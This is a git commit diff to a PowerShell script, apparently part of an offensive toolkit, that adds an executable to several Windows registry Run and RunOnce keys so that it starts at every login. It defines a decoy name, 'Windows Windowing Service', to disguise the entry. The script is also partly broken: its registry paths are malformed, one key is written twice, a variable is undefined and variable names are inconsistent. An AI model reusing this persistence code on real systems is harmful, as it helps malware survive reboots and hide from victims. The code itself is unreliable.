4967b5fe8e1ce5823b343dc8b3d6c7c7203f32e7
CoffeeHaus <neumann6994@gmail.com>
2020-05-29 23:03:46 -0500

    Update AddToAutoRun.ps1

--- Powershell/AddToAutoRun.ps1
+++ Powershell/AddToAutoRun.ps1
@@ -1,6 +1,25 @@
 #Commands to add exe to registry
 
-$PathtoEXE = "C:\Users\user\Documents\tool.exe"
+$PathtoExe = "C:\Users\user\Documents\tool.exe"
 $DecoyName = "Windows Windowing Service"
 
-New-ItemProperty -path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -name "Anything" -value $PathtoEXE -propertytype "string"
+#####User 
+
+
+$Reg = "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
+New-ItemProperty -path $Reg -name "Anything" -value $PathtoEXE -propertytype "string"
+
+#Only works on 64 bt
+$Reg = "HKCU\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run"
+New-ItemProperty -path $Reg -name "Anything" -value $PathtoEXE -propertytype "string"
+
+$Reg = "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows\Run"
+New-ItemProperty -path $Reg -name "Anything" -value $PathtoEXE -propertytype "string"
+#Run the program once, then clears after run
+$Reg = "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce "
+New-ItemProperty -path $Reg -name "Anything" -value $PathtoEXE -propertytype "string"
+
+$Reg = "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows\Run"
+New-ItemProperty -path $Reg -name "Anything" -value $PathtoEXE -propertytype "string"
+
+Copy-Item -path $PathtoExe -Destination $Dest
